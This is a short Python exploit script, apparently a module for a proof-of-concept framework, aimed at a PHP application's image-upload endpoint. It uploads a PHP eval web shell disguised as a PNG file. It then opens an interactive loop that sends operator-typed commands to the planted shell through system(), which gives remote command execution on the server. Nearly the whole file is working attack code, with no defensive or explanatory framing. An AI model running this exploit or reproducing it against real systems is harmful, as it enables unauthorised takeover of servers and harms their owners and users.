from lib.core.data import target
import urlparse
import requests
import re
def poc():
	try:
		if  not target.url.endswith("index.php"):
			print("[*] Please make sure the url end with 'index.php'")
			exit()

		# upload the shell
		url = target.url + "?s=/components/imgupload"
		password = raw_input("[*] Please enter the shell-password:")
		phpshell = "<?php eval($_POST['%s']);?>" % password
		files = {'imgPhoto': ('test.php', phpshell, 'image/png')}
		r = requests.post(url,files=files)
		shell = target.url.replace("index.php", r.text)
		print "[*] The shell url: " + shell
		print "[*] The shell password: " + password

		flag = 1
		while flag:
			try:
				command = raw_input("[*] input the command:")
				payload= 'system("%s");' % command
				if command != "exit":
					postdata = {
						password : payload
					}
					r = requests.post(shell, data=postdata)
					print r.text.encode(r.encoding)
				else:
					flag = 0
			except EOFError as e:
				print "[*] type 'exit' to quit"
				pass
	except KeyError as e:
		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
